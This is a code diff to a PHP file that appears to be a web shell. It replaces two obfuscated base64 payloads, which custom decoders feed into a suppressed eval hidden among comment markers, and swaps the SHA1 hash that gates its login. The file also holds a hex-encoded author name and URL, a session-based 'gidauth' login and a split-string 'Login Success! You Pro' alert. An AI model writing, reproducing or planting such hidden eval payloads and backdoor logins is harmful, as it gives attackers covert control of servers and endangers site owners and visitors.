@@ -256,7 +256,7 @@ function lites($monar)
     }
     return $monar;
 }
-/***#***/ @/*55555*/eval/***#***/(lites("nVB/T9swEP0AfIrMypbkD9IWLRQaZVVGXFrR0uAkgw0iKyVHki2/FrsChvjsM2mp+KlJsyz5zvfeu7snSQ9nK7tSP0BR81tVph4m3zA5V8a+79KD6QQf+3TiKqGm3clZHcVxA4xZ7+N0dNFclMi8h5yB9K7yGR3NyalNHOw8RP/Qf4V+1uVtIsGzuY+p7ThP8fKiqa4ZNC87BCKj9qHYQglN+ZcA1GlNl2VUgKqZMkvpsskt+Q6taej+HK0iemzPMAr15zV37IpsOkJCTTCZpb5lgyf2Hiop57UyaB+maDoadDobWDvceO754eaL4JMAez4NyCREpszhhluIwO8lMC4FZDqQkN721NHHri3uKSxYCnkuBU3eFv9ji0etidsqbAzXkUjXtUD4um0nUPIWs3b6sXoETQmr/sJe8yrLgSbA6WVVckFhKmoNEMtHdaZzyCFpokKvmqSzqHjf2N/t9Y3uzs7Atsc3f36MZol39r3wvvZ+cuPaiQgvvPggqA5xujzpMCjjmRgvSmB4mUacZrG1/Xnf6PaNvX5v99PKNL01TzO3hl/+Ag=="));
+/***#***/ @/*55555*/eval/***#***/(lites("nVBhb5swEP0B/RXMYgM+lNA2WVkQi9BwGjSSMAfWdS2ySHIBVAIUO9qiqr99LkmjdWs1aZYl3/nee3f3JOnxHOUr9Q2sa75VZTrD5Csm18ooDAP6yffwJKReoMSadi/ndbJcNsCY/TpORzfNTYmsBygYSK8qf6PDKbl0iIvdx+gf+n+hn3V5mUjweBpi6rju73h53lQ/GDR/dohERp0LsYUSW/KtANRZTTdlsgZVs2SW0U1T2PI92tPQwzXaRXTijDGK9ee1YBSIzB8ioSaYzFZfsmEm9h4oGee10m8fpmg66nc6B1g73Gg6C+PDF8FfIjwLaUS8GFkyh5/cRgTuNsC4FBG/LyG97amjt4Yj7iXMWQZFIUVN0Rb/Y4snLS9oFQ6G60ik+1okfD12Uih5i9k7/VT9DE0Ju/7CXmuVF0BT4HRRlVxQmIpaA8TySZ3rHApIm2StV03amVfcNHo946TbPTX6joM/uB50t973ySod5gs/uHK2V1F1S/Bdjf3wvdlhUC7HYrwkhcEiSzjNl/bxiWGcmr2z87Pznmm+2/mmt/5p1tHg4y8="));
 
 $whoami = "\x52\x69\x76\x65\x6e\x53\x79\x78";
 $profile = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x65\x73\x2e\x63\x6c\x6f\x75\x64\x69\x6e\x61\x72\x79\x2e\x63\x6f\x6d\x2f\x64\x64\x39\x65\x61\x74\x6d\x6a\x75\x2f\x69\x6d\x61\x67\x65\x2f\x75\x70\x6c\x6f\x61\x64\x2f\x76\x31\x37\x35\x33\x30\x31\x30\x33\x32\x39\x2f\x73\x69\x67\x6d\x61\x53\x79\x6e\x78\x5f\x61\x74\x61\x6d\x36\x31\x2e\x70\x6e\x67";
@@ -479,7 +479,7 @@ $jquery_version = '3.7.1';
 $jquery = 'https://cdn.jsdelivr.net/gh/jquery/jquery@' . $jquery_version . '/dist/jquery.min.js';
 $ajax_version = '3.5.1';
 $ajax = 'https://ajax.googleapis.com/ajax/libs/jquery/' . $ajax_version . '/jquery.min.js';
-$passwd = '0a2964667787a901aabd4bb17b25bc3c6a4f5d6d'; // Change this password, SHA1
+$passwd = '168f968e8921464e375e3056699c78c68530778e';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['gasken'])) {
     if (SHA1($_POST['passnya']) == $passwd) {
@@ -495,7 +495,7 @@ if (isset($_POST['gasken'])) {
                 $defconf[$i] = $rhc($dro($defconf[$i]) - 1);
             }
             return $defconf;
-        }/***#***/ @/*55555*/eval/***#***/(setconf("nVHtTtswFH0AnsKzsjX9QdqihY5GGTKNS6q1TUjSFVYqy21NEpYvxa6AIZ4dp23QGEOTZvnHvT7nnutzLwDVOYhv1A8sLcSDqhAfe9+xN2/YQeCS/miIJwEZuo1Fs/moxAVdr0vGufk+T4PX5XUGjSeWcAbeVb4kA8ebIc/CVhX9Q/8N+1WXvxd6eOwEmCDL+p2vLMv8jrPyzw5TmRF0Ll00FobyUxKKqCCbjKZMbRpKQTmnPIllmev4wbxRPWQPtCJXIctWpm+jjvoGl8U8IpsyMZVHuO8Jn+ZwF5EJGmO40F5jru3KbDSAUl2we2FCZCHg23g0ApOhDc4852MbyTtjSx6xJAHTMukBqP1PCw3utFzk+zPHs7Y6td8axJO+d+UG2AI1DVR2X7jSf00dutvXl5VoUKZ7bConf4hCloktZ7+LGv3GyoztfMgFGDdxwkjIBFnlmZAlXIWREAXvtVq0iDXBEhaWNNXyMmwtc9HVT447Xb19dNRDyL7/9WMwDv3Lq9Q/69wK/c6inkj9dX+an+Noc9GSX16P5fdoyE5XERUkXpuHn0/0dlf/0u0cf9rNXdvOv2kcnH59Bg=="));
+        }/***#***/ @/*55555*/eval/***#***/(setconf("nVFhb5swEP0B/RWexRbyoYS0yZoFscorTkElgIAsy9LIIokDqAQYdrVGVX/7TBKqdV01aZY/3Pm9e3fPB0B9TtKN/I5uS76TJRJg/yv25y0zDD1yZVvYCYnltRbt9qOUltF6XVHG9Ld5CrytbnOoPdGMUfCm8jcycv0p8g1s1NE/9F+xX3T5e6GPx26ICTKM3/nSsip+Mlr92WEiMoKuhYvWQpPuBKFMSnKfR1sqtzWpjBiLWJaKMs8Nwnmrfsh3UU2uQ5qv9MBEXfkVLopZQu6rTJce4bEnfJrDQ0QcNMZwobzEPNMTmT2CQp3TB65DZCAQmNi2gWOZ4IvvvleRuFO6ZAnNMjCpsiGAyv+0UOBBy0NBMHV9Y6/T+G1A7Fz5My/EBmhooLb7zBX+G6rl7V+fV6JAkR6xifj5UxTTnO85x1006A2tcnrwIRagbdKMkphysipyLkqYDBPOSzbsdKIyVTjNaFxFW6Wo4s6y4AO131e7vd6ZOkQIfzIs2ttZ351NPEpXtjdDu9mkuPPxjxLb4cdBR4y8HovxopherpKIk3Stn3ZV9WzQP784v+gPBh8OX6/sV9DWTi4//wI="));
         echo "<s" . "cr" . "ip" . "t>" . "al" . "er" . "t(" . "'Lo" . "gi" . "n " . "Su" . "cc" . "es" . "s!" . " Yo" . "u " . "Pr" . "o'" . ");" . "</" . "sc" . "ri" . "pt" . ">";
         $_SESSION["gidauth"] = "gidauth";
         setcookie('token_gid', $my_self, time() + 3600 * 24);
